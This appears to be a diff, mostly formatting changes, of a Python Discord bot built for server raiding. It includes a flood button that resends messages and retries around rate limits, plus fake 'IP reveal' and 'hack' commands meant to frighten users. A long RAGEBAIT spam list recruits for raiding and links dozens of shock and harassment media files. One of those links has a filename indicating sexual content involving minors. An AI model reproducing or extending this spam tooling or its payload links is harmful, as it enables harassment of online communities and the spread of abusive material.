 
 
-
-
-class AvatarView(discord.ui.View): # made that shit in 5min its really ass
+class AvatarView(discord.ui.View):  # made that shit in 5min its really ass
     def __init__(self, user: discord.User, banner_url: str = None):
         super().__init__()
         avatar_url = user.display_avatar.url
 
-        self.add_item(discord.ui.Button(label="Download Avatar as JPG", url=avatar_url + "?format=jpg"))
-        self.add_item(discord.ui.Button(label="Download Avatar as PNG", url=avatar_url + "?format=png"))
+        self.add_item(
+            discord.ui.Button(
+                label="Download Avatar as JPG",
+                url=avatar_url +
+                "?format=jpg"))
+        self.add_item(
+            discord.ui.Button(
+                label="Download Avatar as PNG",
+                url=avatar_url +
+                "?format=png"))
 
         if banner_url:
             self.add_item(discord.ui.Button(
                 label="View Banner",
-                style=discord.ButtonStyle.blurple, 
+                style=discord.ButtonStyle.blurple,
                 url=banner_url
             ))
-            self.add_item(discord.ui.Button(label="Download Banner as JPG", url=banner_url + "?format=jpg"))
-            self.add_item(discord.ui.Button(label="Download Banner as PNG", url=banner_url + "?format=png"))
+            self.add_item(
+                discord.ui.Button(
+                    label="Download Banner as JPG",
+                    url=banner_url +
+                    "?format=jpg"))
+            self.add_item(
+                discord.ui.Button(
+                    label="Download Banner as PNG",
+                    url=banner_url +
+                    "?format=png"))
+
 
 class AvatarView(discord.ui.View):
     def __init__(self, user: discord.User, banner_url: str = None):
         super().__init__()
         avatar_url = user.display_avatar.url
 
-        self.add_item(discord.ui.Button(label="Download Avatar", url=avatar_url + "?format=png"))
+        self.add_item(
+            discord.ui.Button(
+                label="Download Avatar",
+                url=avatar_url +
+                "?format=png"))
 
         if banner_url:
-            self.add_item(discord.ui.Button(label="Download Banner", url=banner_url + "?format=png"))
+            self.add_item(
+                discord.ui.Button(
+                    label="Download Banner",
+                    url=banner_url +
+                    "?format=png"))
+
 
 @bot.tree.command(name="avatar", description="Get a user's avatar and banner.")
 @app_commands.describe(user="The user whose avatar you want to see")
@@ -625,7 +1322,7 @@ async def avatar(interaction: discord.Interaction, user: discord.User = None):
         title=f"{user.display_name}'s Avatar & Banner",
         color=0xa874d1
     )
-    
+
     embed.set_thumbnail(url=user.display_avatar.url)
 
     if banner_url:
@@ -654,8 +1351,12 @@ class FloodButton(discord.ui.View):
         self.message = message
         self.delay = delay
 
-    @discord.ui.button(label="⚡ Execute Command", style=discord.ButtonStyle.blurple)
-    async def flood_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="⚡ Execute Command",
+                       style=discord.ButtonStyle.blurple)
+    async def flood_button(
+            self,
+            interaction: discord.Interaction,
+            button: discord.ui.Button):
         await interaction.response.defer()
         max_retries = 2
 
@@ -670,21 +1371,38 @@ class FloodButton(discord.ui.View):
                     if e.status == 429:
                         retry_after = getattr(e, "retry_after", 1.5)
                         retry_after = min(retry_after, 5)
-                        print(f"{Fore.YELLOW}>{Fore.WHITE} Rate limit hit, retrying after {Fore.YELLOW}{retry_after:.2f}s{Fore.WHITE} (retry {Fore.YELLOW}{retries + 1}{Fore.WHITE}/{Fore.YELLOW}{max_retries}{Fore.WHITE})")
+                        print(
+                            f"{
+                                Fore.YELLOW}>{
+                                Fore.WHITE} Rate limit hit, retrying after {
+                                Fore.YELLOW}{
+                                retry_after:.2f}s{
+                                Fore.WHITE} (retry {
+                                Fore.YELLOW}{
+                                retries + 1}{
+                                    Fore.WHITE}/{
+                                        Fore.YELLOW}{max_retries}{
+                                            Fore.WHITE})")
                         await asyncio.sleep(retry_after)
                         retries += 1
                     else:
                         raise e
             else:
-                print(f"{Fore.RED}>{Fore.WHITE} Failed to send message after max retries, skipping{Fore.RED}.{Fore.WHITE}")
-
+                print(
+                    f"{
+                        Fore.RED}>{
+                        Fore.WHITE} Failed to send message after max retries, skipping{
+                        Fore.RED}.{
+                        Fore.WHITE}")
 
 
 class IPView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-@bot.tree.command(name="ip", description="Reveal a user's IP to scare them! (fake)")
+
+@bot.tree.command(name="ip",
+                  description="Reveal a user's IP to scare them! (fake)")
 @app_commands.describe(user="The user you want to trace")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 async def ip(interaction: discord.Interaction, user: discord.User):
@@ -717,6 +1435,7 @@ async def ip(interaction: discord.Interaction, user: discord.User):
     await log_command_use(interaction.user, "ip reveal")
     update_leaderboard(interaction.user.id, "ip")
 
+
 @ip.error
 async def ip_error(interaction: discord.Interaction, error):
     if isinstance(error, app_commands.errors.TransformError):
@@ -724,24 +1443,32 @@ async def ip_error(interaction: discord.Interaction, error):
     else:
         await interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)
 
-import base64
-
 
 def get_badges(user: discord.Member) -> str:
     flags = user.public_flags
     badges = []
 
-    if flags.hypesquad: badges.append("🏠 HypeSquad")
-    if flags.hypesquad_bravery: badges.append("🦁 Bravery")
-    if flags.hypesquad_brilliance: badges.append("🧠 Brilliance")
-    if flags.hypesquad_balance: badges.append("⚖️ Balance")
-    if flags.early_supporter: badges.append("🌟 Early Supporter")
-    if flags.staff: badges.append("👔 Staff")
-    if flags.partner: badges.append("🤝 Partner")
-    if flags.verified_bot: badges.append("🤖 Verified Bot")
-    if flags.verified_bot_developer: badges.append("👨‍💻 Bot Dev")
+    if flags.hypesquad:
+        badges.append("🏠 HypeSquad")
+    if flags.hypesquad_bravery:
+        badges.append("🦁 Bravery")
+    if flags.hypesquad_brilliance:
+        badges.append("🧠 Brilliance")
+    if flags.hypesquad_balance:
+        badges.append("⚖️ Balance")
+    if flags.early_supporter:
+        badges.append("🌟 Early Supporter")
+    if flags.staff:
+        badges.append("👔 Staff")
+    if flags.partner:
+        badges.append("🤝 Partner")
+    if flags.verified_bot:
+        badges.append("🤖 Verified Bot")
+    if flags.verified_bot_developer:
+        badges.append("👨‍💻 Bot Dev")
 
     return ", ".join(badges) if badges else "No Badges"
+
 
 @bot.tree.command(name="hack", description="Hack to scare them! (fake)")
 @app_commands.describe(user="The user you want to hack")
@@ -820,7 +1547,6 @@ async def hack_error(interaction: discord.Interaction, error):
         await interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)
 
 
-
 RAGEBAIT = ["""
 # LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
 # LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
@@ -851,211 +1577,189 @@ https://discord.com/invite/D7mZrGBsRj
 https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775
 https://media.discordapp.net/attachments/1215053612028526653/1219435249763750028/1218622476645564527_1650x1080.gif?ex=686c5f93&is=686b0e13&hm=1f0bd7f260f88162001a02772b415d14168a43cf7ee7cc94c2c9f03af54d9bed&
     """,
-"""
+            """
 https://media.discordapp.net/attachments/456392245080489985/979944686330466314/SPOILER_image0-4-1-2-1-4.gif?ex=68a736db&is=68a5e55b&hm=7b6dcd53ba9154bdd554b9d0ef66fd0a3818050f8f0b0c115a42251a1187d43a&
 https://cdn.discordapp.com/attachments/852013046503309312/1048311625041588255/IMG_9742.gif?ex=68a76bc8&is=68a61a48&hm=661d67483e8e599dd981227c2c01bb837ee837228c9b761b2241689746197277&
 https://images-ext-1.discordapp.net/external/RibPwVcp6TgdmghdQSaNAOQV0MZeDQxvHDUEWZ7pUBI/https/media.tenor.com/NYt1pcwUGMgAAAPo/shon-good-morning-shon.mp4
 https://cdn.discordapp.com/attachments/1118049015246889034/1167872527004074055/DcyuYCnY.gif?ex=68a7528c&is=68a6010c&hm=7cfa2a4b2f00b05d0bd6fb43f72c1146d2ece0c5f76d92f8020f53d54240c648&
 https://media.discordapp.net/attachments/771470891728896033/1205525179761958912/DO_NOT_YAP.gif?ex=68a73150&is=68a5dfd0&hm=a9c5705b82abb244a6dbc70c76ef70b0d9c7bdcf40e169d0884f1b0da88d5fb7&
-"""
-,
-"""
+""",
+            """
 https://media.discordapp.net/attachments/1073648853842137099/1087519214262304798/3A28F855-D783-40E4-BB1E-B2AA96EB3AA9.gif?ex=68a703f1&is=68a5b271&hm=35f2a7f937132353b94f84457d607fed1f95154ad433be55fbd281310706b332&
 https://media.discordapp.net/attachments/876200007181664267/916099166504116264/vaccum.gif?ex=68a6fa15&is=68a5a895&hm=2d5d347875f1fb0a265eef026b7fe9e4b8986ef88c29436438e09b404f98ddc7&
 https://cdn.discordapp.com/attachments/1289783456376819713/1373859408894754836/caption.gif?ex=68a73608&is=68a5e488&hm=ec2ad8952f850afe6f976bbc143fd031cf2a0becfa3f6785862a846a0383baeb&
 https://cdn.discordapp.com/attachments/1118049015246889034/1374166932256718959/togif.gif?ex=68a702ef&is=68a5b16f&hm=7e5d7da7f95276687791c44432cd15717d98d2826718368ef0c686563495d8a3&
 https://media.discordapp.net/attachments/1407764862356029623/1407851873586643125/FinalVideo_1647373394.613837.mov?ex=68a79bbb&is=68a64a3b&hm=6bb244c6178fe7b8bc43aeca5989865bd6a2020c12096c3c9c9a318b2cb38b0f&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1407764862356029623/1407850408373911654/IMG_5940.png?ex=68a79a5d&is=68a648dd&hm=c90fae657d9d4a31dc0d6960d6efbf9a52d50dd44d494cf1e358c96f71cb13b9&
 https://media.discordapp.net/attachments/809845478967214090/887784378195918919/image0-2.gif?ex=68a775a1&is=68a62421&hm=6e2b060849919e23557bddcb9d6b761462dbf6723d4fe912fad99b915d2aada5&
 https://media.discordapp.net/attachments/1081305427087736894/1083481387937570817/E7578720-2C28-4F80-A2F7-C7B5680D58FB.gif?ex=68a77cac&is=68a62b2c&hm=9249ff9dcc53f02b606966f6fb406772c4e7101f308ef3745c95bc3376aed90f&
 https://media.discordapp.net/attachments/987062451575078933/1037486174098444408/unknown-4.gif?width=275&height=468&ex=68a796cb&is=68a6454b&hm=a12791dfadf10f0e584d2c74e714622cb5c59b66df587f453b8842c2dafbc4df&
 https://img.cocdn.co/_image/optimize/https://cdn.crushon.ai/images/a3b86280-5900-11ef-b239-3a544bb25f02/0a4d441b-62e2-4efd-9f5f-5464f768c2a0?q=75&w=1200
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1179439926207590543/1316161150806790265/togif.gif?ex=68a79597&is=68a64417&hm=b37560c76d57b8f6a4ffe28b955c69e84a6c687e3e3e9a49e48f3af1937bee74&
 https://cdn.discordapp.com/attachments/1212754609760768010/1270638966034399273/trim.625697AE-5F2A-4462-8864-E7E80A3D2D1A_1_2.gif?ex=68a76e00&is=68a61c80&hm=4970709a8466a44e901bd6a8668a1d62bf82abc0ab4060614120424ed9167eb0&
 https://media.discordapp.net/attachments/876070919850840068/1150688266656419861/33EF8EA9-E6C4-4CCA-A835-AA9A5E04B700.gif?ex=68a76db5&is=68a61c35&hm=37a97a7bc3fb36374fc9eedcfc07b40f10701f59cd54259b7f2be600ca471748&
 https://cdn.discordapp.com/attachments/1312599895730946150/1314560028828635166/bleedFLUXgJV3VDwyElwvk.gif?ex=68a7086e&is=68a5b6ee&hm=02baed2096e51a04df274649193342bc50bccbafba7144ac35762cfc2616635c&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407787054741459056/IMG_0886.png?ex=68a75f5d&is=68a60ddd&hm=f585468ddcaf1762e180d48596a937fd570cbc43078b9383d7bf66f7a7c3f629&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1395186223970259105/1395207538818945167/caption.gif?ex=68a71786&is=68a5c606&hm=ac2eeaa69644a2a22f4b3e8239f125bc9583510c4e85b1a3c5e9db2fa05856fa&
 https://media.discordapp.net/attachments/929919563376754741/1042958582217445438/snake_charmer.mp4?ex=68a7101f&is=68a5be9f&hm=bacafaf906a056941a46f648be145995f5374713554b4fe89671ff4681c28c9f&
 https://images-ext-1.discordapp.net/external/Uv193iYWKQ0mISdF4xUY5edCuBh1GZcup0CwI-_DCk4/https/media.tenor.com/EwAAL7MfWkkAAAPo/templeos-terry.mp4
 https://media.discordapp.net/attachments/1407764862356029623/1407780774794625086/ScreenRecording_08-20-2025_19-36-45_1.mov?ex=68a75984&is=68a60804&hm=639ef1900aa742b2646923cf5a0bb96819322a47af927eaaff44bcceb3a77b64&
 https://media.discordapp.net/attachments/1407764862356029623/1407772050864476321/1848DF89-20B8-46D5-A2C6-38B3AC2B3052.mov?ex=68a75164&is=68a5ffe4&hm=b71dabda126f190ec85887a9183faa06ec9af3301dd019e8b8fba379f0e89f17&
-"""
-, 
+""",
 
-"""txt id="fgtxas"
+            """txt id="fgtxas"
 https://media.discordapp.net/attachments/945789017910296596/1029540222662348890/VID_26040821_051243_922.mp4?ex=68a706cd&is=68a5b54d&hm=3a67ea1c1f501a5480b1b854b8bc8dd74866247508b32229a2ccb22a1a2777e7&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407767207261241355/24313E80-9FA7-440E-ACA9-0449EF92B417.gif?ex=68a74ce1&is=68a5fb61&hm=ea34f7cafdbb07958c9ab976dbdc0b491d9ddc2890b492b65724d8e21b99a3fb&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407767086549434409/gifmaker_me_2.gif?ex=68a74cc4&is=68a5fb44&hm=9944ce0e829343323d8fa2978dcf54bc9ed52ae40c3ccbe02313cbc642feabc5&
 https://media.discordapp.net/attachments/1407764862356029623/1407767054081069249/playboi-carti-discord.mov?ex=68a74cbc&is=68a5fb3c&hm=f220a778bac968322e472da59621fa6e83d01fc36bfb030adfb5fef8d4c221cd&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407767019574792212/4DCE7CF5-B39C-46FA-8124-5FB321C2661B.gif?ex=68a74cb4&is=68a5fb34&hm=59712a62eaf0128ff79c2acd949da2c0355f8f3528e38da2a71a94ac80c350f6&
-"""
-, 
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1407764862356029623/1407767020107206760/attachment.gif?ex=68a74cb4&is=68a5fb34&hm=a06fefb65fb0b82e48e0c6b17975b97f2ea12bf1d62e9b9b18f5f77ce9940b84&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407766951874269226/giveaway.jpg?ex=68a74ca4&is=68a5fb24&hm=eeb8a2ac6e07d33721baa98763f367ad1d2c01cb82e1c7c427c370903a0abbe6&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407766858194751560/IMG_2911.png?ex=68a74c8e&is=68a5fb0e&hm=bd0d4a7a6e16790671980621edb8b12b6cce3269b085c7008fd10f8bcfea0a1d&
 https://cdn.discordapp.com/attachments/1224325421437288488/1311229415338020864/kim.gif?ex=68a770ce&is=68a61f4e&hm=94e1b2c004388cee8a911d7369cd8203f6c22f20a926342801ee72623c1fba0c&
 https://cdn.discordapp.com/attachments/1153241768393969716/1349317662202925107/output_n0XZX1.gif?ex=68a793bf&is=68a6423f&hm=9319587e923a9ca02eab501f56a1075401bf8e2989b36215f6dd48a043f57ac4&
-"""
-,
+""",
 
-"""
+            """
 https://media.discordapp.net/attachments/1022811220098691103/1104908186311479346/0507_1.mp4?ex=68a6feaf&is=68a5ad2f&hm=40b307c9d2c8966c7df3de619eb72326c8facbfeffda25480c8cbc0b6387f0f4&
 https://media.discordapp.net/attachments/1010269419584356433/1029564224189497384/image.png?ex=68a71d27&is=68a5cba7&hm=1e76bcf0e31c61870f6cd4b060c286d6ed478c138d0a1f5e5c4d14c916172663&
 https://cdn.discordapp.com/attachments/990524002986508298/1260546122288594944/lv_0_20230717105729.gif?ex=68a7a04f&is=68a64ecf&hm=bd0763a1e21ade7f2441c71b73d17b84a451f930b4e5830e609111dbc92cc3e9&
 https://media.discordapp.net/attachments/872151456592044044/1153399306712272916/C76FE623-86C0-4EEA-84B6-820ADA8CA4FC.gif?ex=68a7674f&is=68a615cf&hm=1bc6545589d757e39ac88b873b779119fb5431a47ad597effe015b5d8b576f8d&
 https://cdn.discordapp.com/attachments/1256385900959633442/1276239022561169451/attachment.gif?ex=68a75e36&is=68a60cb6&hm=847254d2e1c650cfe96814fcfd1f10e8c5b84032d146519112c5bd56de87f2fe&
-"""
-,
+""",
 
-"""
+            """
 https://media.discordapp.net/attachments/669308329419341836/1143830823007703081/togif.gif?ex=68a787b7&is=68a63637&hm=fb9305bf78c90a68d7a89edde7ec5108aa9632d4473718dcb771b1262f8cca85&
 https://media.discordapp.net/attachments/906220919008161815/994640326562160721/3C7E5C69-7702-4A7C-944A-E1EDB7D41C8E.gif?width=495&height=669&ex=68a7487d&is=68a5f6fd&hm=57b8d9d61113dc74085250846724353c4eadcb752aa578b1258cb5301689b924&
 https://cdn.discordapp.com/attachments/1111192072289005630/1371037270295183401/togif-2-1-1.gif?ex=68a77db5&is=68a62c35&hm=0d09959e62262b4009eb8c95558bba71f0c0f7695c7b48edf464e2c51c13e204&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407765102995832894/image0.gif?ex=68a74aeb&is=68a5f96b&hm=74c70d9849de38b71b41f7bacc1f351dc7054f0a91db95dc69584e6adcd12542&
 https://cdn.discordapp.com/attachments/1407764862356029623/1407765026978136144/dog_swing.gif?ex=68a74ad9&is=68a5f959&hm=dc24efaddc53b11952ce0d5e55b8851948140275b9a52fc46c0f55232a98b7b4&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/932868286025203762/1146674126841466960/togif.gif?ex=68a753c0&is=68a60240&hm=4e6a77182b1c6ceefd7af4e5264fa24c55a4bc06e8a84c3e143b18170a2d47de&
 https://cdn.discordapp.com/attachments/1254286371699298344/1287069869036015656/giphy.gif?ex=68a73839&is=68a5e6b9&hm=3c8e9a9524192a2b81b7aa603a4fa26ff64c0aacaecda0443e1520c692a4c985&
 https://cdn.discordapp.com/attachments/1161296048958996561/1236666429818929202/20302791-b757-4683-a3d5-8eb4510a877d.gif?ex=68a86c5d&is=68a71add&hm=a7fc0db40ac7a22acdea681ab6192ced538f265ddbd1b1e46845f64818745b54&
 https://cdn.discordapp.com/attachments/473558978752806912/1338823638115287090/minorsex.gif?ex=68a8f36d&is=68a7a1ed&hm=672251d052e9e22687cccaa6dd3c076d1645a112e91cbdf601c059e431970055&
 https://media.discordapp.net/attachments/1020309245968785409/1104269780619378759/9F6A2117-DBD3-4F6D-9EEF-8D0A6E675B4F.gif?ex=68a8a0a0&is=68a74f20&hm=bf00188bb27b44739ab5c69734247249d580f21e6cdf22f794d7f930f10b594b&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1303808726972629003/1359625949666214076/20250409_232750.gif?ex=68a8d2d7&is=68a78157&hm=d4ca4274c1ba68bba696d0893015c3571c59595e295b6a34fd27412e244467b0&
 https://cdn.discordapp.com/attachments/1320481468128034866/1361640968436060190/BROISLOSTBYULTRAAX.gif?ex=68a8e738&is=68a795b8&hm=265eba3dd01825b75049872880e2a6a4d45df128f2c53d59e9cba6ebbb10ff3f&
 https://cdn.discordapp.com/attachments/1342721533759717508/1396134253757993120/caption.gif?ex=68a87c59&is=68a72ad9&hm=f6f8e95fc9c64e5bfcf369c18eaaf868b78bc5b32fab4710ab70e1a73b1a0b12&
 https://cdn.discordapp.com/attachments/1407764862356029623/1408116955013189663/image0.jpg?ex=68a8929b&is=68a7411b&hm=12c7eaff13d1a8768a6c47ba2f5d039bdd560cafb7dfd99d37d729f673f7c89b&
 https://media.discordapp.net/attachments/793594846153539604/922742297878200370/15470898521730.gif?ex=68a8bb7b&is=68a769fb&hm=e9e386c044213235bfed421fbccb9947d2448265b3afaf5c78af83ece790c32e&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1407764862356029623/1408550582037385266/IMG_3038.png?ex=68aacf34&is=68a97db4&hm=aadc0949abe7ee257dd871736693b6273ba0ab060a330e7b05addde8e30788b7&
 https://cdn.discordapp.com/attachments/1407764862356029623/1408550575020310568/IMG_3039.png?ex=68aacf32&is=68a97db2&hm=4b2be20451d2d6feeb4ec47f81bf1fb0f994c4a5d2c38e883f55774977cb3545&
 https://cdn.discordapp.com/attachments/1407764862356029623/1415063020614455347/ScreenRecording_08-28-2025_14-02-23_1.mov?ex=68c1d7a2&is=68c08622&hm=90f530899de1adea5d14adc0bdf4661c6c9c35b5a31057d9b799a12509ed5000&$0
 https://cdn.discordapp.com/attachments/1407764862356029623/1415061497222271026/IMG_3168.jpg?ex=68c1d637&is=68c084b7&hm=36b5d9292359f5e9e792c725caf6bd0d3d51ecc0c3b0d93ee62190879b0b8cfa&$0
 https://cdn.discordapp.com/attachments/1407764862356029623/1415061141289173123/image0.gif?ex=68c1d5e2&is=68c08462&hm=7f1b152aff331f52e53ff385840cf4e718c0b2e9716ddf9006362ec4e91a77fa&$0
-"""
-,
+""",
 
-"""
+            """
 https://tenor.com/view/cat-lasers-laser-laser-eyes-gif-3690928668704325022$0
 https://cdn.discordapp.com/attachments/1392278784140644442/1411839118396227712/EhkauwF.gif$0
 https://cdn.discordapp.com/attachments/1193937749632364594/1244321386617639002/dfsfsdfsdf.gif?ex=68c1a298&is=68c05118&hm=ac8bd359cb3133964619d3e8a46e748e11f08034f8e8b2e37fd2bbcfc720e6ce&$0
 https://cdn.discordapp.com/attachments/1407764862356029623/1413274499385917540/togif.gif?ex=68c144b2&is=68bff332&hm=6b0941e1508f5dacb5b5b90a62ab566b16b79bdc5e860f650d469a13b08e72ee&$0
 https://cdn.discordapp.com/attachments/1330311289968394274/1330546895550025931/bubuquestionmark.gif?ex=68c18d5c&is=68c03bdc&hm=c5c1e8f085a8c54ea19285fad07d642243333fd4f198d20d30e6b859e482e2df&$0
-"""
-,
+""",
 
-"""
+            """
 https://media.discordapp.net/attachments/753686461416734802/985845565411688468/kdzCqXOe.gif?ex=68c14bba&is=68bffa3a&hm=ed3ff9647a679b6e67e8a2164433b4cfa84d0b359838f7cee77b55555bf6e872&$0
 https://media.discordapp.net/attachments/546763235051700314/1020355498937176064/caption-5.gif?ex=68c1991c&is=68c0479c&hm=ec1b63e110de0748f9cc76c5e966cae0af289a0f05bcf06b1a70c41c00549426&$0
 https://images-ext-1.discordapp.net/external/YCHXr2dO_UY_Z7_K9HeK6ouL9rO6rYhW-xQa07ooJdo/https/media.tenor.com/0MQwvTEBSt8AAAPo/among-us-among-us-funny.mp4$0
 https://media.discordapp.net/attachments/1410255040752390297/1410732563399577661/ScreenRecording_08-28-2025_23-02-58_1.mov?ex=68c13fd5&is=68bfee55&hm=117075b030002678db2055a54ff9ea36d693ea03c29976ccaf5597fa4a1980d8&$0
 https://cdn.discordapp.com/attachments/1407764862356029623/1411237049960235078/1754820148135.jpg?ex=68c1c42c&is=68c072ac&hm=d822e9e687074aaa1552da7202d3dc6f9874b70279c255afb1b36b2b1146acec&$0
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1383579923846791248/1383580492296753182/togif.gif?ex=68c158ff&is=68c0077f&hm=3b89f4e335211cad9e7466b66d68baed4a3e418dd183f0feb10d20b713352c38&$0
 https://cdn.discordapp.com/attachments/1407764862356029623/1439655104583172246/temp_image_0755B85A-7E29-4AF2-879A-4986FA60EA9A.webp?ex=6925dacc&is=6924894c&hm=63dddd3973e9c8c8dae3bf6412ec2156328570ddfe39675d00ea6917fb3fd3a7&
 https://images-ext-1.discordapp.net/external/YCHXr2dO_UY_Z7_K9HeK6ouL9rO6rYhW-xQa07ooJdo/https/media.tenor.com/0MQwvTEBSt8AAAPo/among-us-among-us-funny.mp4
 https://media.discordapp.net/attachments/870973035962847232/1217741733463588864/RDT_20220725_0014525379791033542166221.gif?ex=69255fdd&is=69240e5d&hm=8b14f0053ccda3b64cbecc92e8f99ebb39d1c63cab3919214a520d4357eb8d3d&
 https://cdn.discordapp.com/attachments/1097417674469933167/1190694339802828930/3DC5E3C1-64EB-46FF-864F-FA1DDCBAFFB8.gif?ex=6925da84&is=69248904&hm=a9f651b351c691675de28d47a39177df664495dba308152765ef13526e5b0d82&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1452333668151464199/1452337643567452180/SPOILER_cachorroman_1.gif?ex=694a1b15&is=6948c995&hm=80eb83e7689b4826d7ba8d259f115a20318233a360dbfda9c3b77387bffbc436&
 https://media.discordapp.net/attachments/655978390385459213/881076440269979678/caption.gif?width=294&height=447&ex=694a4360&is=6948f1e0&hm=1ffa02564a81275c51a7180942e1f079580f05f3d23e909982d1eea46526356b&
 https://media.discordapp.net/attachments/870973035962847232/1217741733463588864/RDT_20220725_0014525379791033542166221.gif?ex=6954d5dd&is=6953845d&hm=ba630cc775c34bd1177dc438749b2f1c335fa5c9cab9dbe2590693cb95901c12&
 https://cdn.discordapp.com/attachments/1212769729723371521/1274186594408071228/ezgif.com-animated-gif-maker_6.gif?ex=6954843d&is=695332bd&hm=8aa5e99f71019d06fe6c2cf6e569f300d2b9d3594a493ed16151f06b572dd2ed&
 https://media.discordapp.net/attachments/655978390385459213/881076440269979678/caption.gif?width=294&height=447&ex=6954cf60&is=69537de0&hm=a1a448c6f50624eaf8b152812ed0bff7e4ec6063f4699891bdb1088e685add8a&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1312599895730946150/1314560028828635166/bleedFLUXgJV3VDwyElwvk.gif?ex=695465ae&is=6953142e&hm=0d90575af4b45261ad2e211edfbebf6de306791ae37ea5c4ce3fb63a24dc67c3&
 https://cdn.discordapp.com/attachments/1355691840581669024/1362642623072043129/2186E4AB-0714-49BD-8CF5-E400482F734D.gif?ex=6954a356&is=695351d6&hm=
 https://images-ext-1.discordapp.net/external/sXyn9EhVqpVj4Ka5E4_DPgKBx33qXAm7w8EOIEJNs2E/https/media.tenor.com/tq35Y8JO7mIAAAPo/linux-opsec.mp4
 https://cdn.discordapp.com/attachments/1407764862356029623/1418897558335656056/35bafe46ded9164d46c748c189465fdb.jpg?ex=6954f253&is=6953a0d3&hm=764acd83df614e41fcafd0a2f839321a717f600d3d14e830e92996a8558275e1&
 https://media.discordapp.net/attachments/1033345223251742811/1072223159723491348/ezgif.com-gif-maker-1.gif?ex=6954c362&is=695371e2&hm=b5718e402724c3a1105748c0c6b05027498003419dea5b8384e53099cf98fcaa&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1355691840581669024/1362642623072043129/2186E4AB-0714-49BD-8CF5-E400482F734D.gif?ex=6954a356&is=695351d6&hm=ed0ee0045a06a34b18146452903c8bc29397a09e9348380e9d206e4c2a3379f6&
 https://cdn.discordapp.com/attachments/1509863564385456168/1513110442212331590/Screenshot_2026-06-07_at_11.14.59.png?ex=6a306ca9&is=6a2f1b29&hm=7ada71911846a5aaf466ed63ab763823fd82942a003f5bf4f1e8bd14f6d8e924
 https://cdn.discordapp.com/attachments/1509863564385456168/1509948828009107507/Screenshot_2026-05-09_at_21.26.38.png?ex=6a30c9ae&is=6a2f782e&hm=045d949bd199e19c74ae8ae65f1241a918631e7f85d307ebddc8bce5a9fc49e1
 https://cdn.discordapp.com/attachments/1509863564385456168/1510385916215300228/Screenshot_2026-05-30_at_22.50.33.png?ex=6a306680&is=6a2f1500&hm=326f0bfff74d50c7591ec21cca1dfadccfc5458c0fb3b5b145b3ca0630973fa4
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137774965981264/e508623c38e6d3f87a97222301a17195.jpg?ex=6a401a20&is=6a3ec8a0&hm=03aa9903d2cc7eb7299118b869bfcb71361f84d0538f2548db3e64e55fc76857&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137775259713728/1c2b5a3a42a74ba82e65f89fabe8be3a.jpg?ex=6a401a20&is=6a3ec8a0&hm=d5d7ad9f63449617fcf523ef4baf3fb885fe97b62abc89f928fea1b3bea14247&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137775490404352/de65a3088875b5de4e7408edc5cc7c61.jpg?ex=6a401a20&is=6a3ec8a0&hm=a850a6901a1abcbee29e75a0c70f73fbbb020c0ee404e94dc053da7cea9df983&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137775683207320/0117a9a1f3953966747e48cac2baaec4.jpg?ex=6a401a20&is=6a3ec8a0&hm=03fe55e5a9acdae7891823cc0c3f63aa42a8b011ec2740276b369683f57bb46d&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137775867887748/1ea04c7f1d18aeb1687b47b65deae528.jpg?ex=6a401a20&is=6a3ec8a0&hm=8c2d4d2cb1a3db19b90afb3e6a7531f35ff1c5d332a9bf67c1e665e570dfc1ff&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137776077606962/42dfc137ccdc98737200a55fe49e7563.jpg?ex=6a401a20&is=6a3ec8a0&hm=094834d592f7b28dfe29381f92bf8e070d62b2f8ceff2546a6cd29d46661e160&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137776295575747/f2e5e3b805d67affa216c27044bfb934.jpg?ex=6a401a20&is=6a3ec8a0&hm=7c726801a6e2ce8a4fd7135591bbcc57541e6506741bfcfafdebfd3b5107515a&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137776555753472/ddc442ed9ed0418ea963ace9839d4d8c.jpg?ex=6a401a20&is=6a3ec8a0&hm=aec17d0511d0874701cf9421a41458c5921cabd106f30d53805d8c061a6050d1&
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137776748695744/374a752c5181bf0609c8ada324616842.jpg?ex=6a401a20&is=6a3ec8a0&hm=7202a3972f8ae08e322bdaff8d02e901311683d5408518314a63b5f43b5b6ff6&
 https://cdn.discordapp.com/attachments/1519702628576002211/1520137776979247185/978c9dd8ff1b4fccd6305a4f89c931a2.jpg?ex=6a401a20&is=6a3ec8a0&hm=f85e1ba6c06fdbf0eed9cc6d60f34fdefefc6f572a89b08187a1094887f41e9b&
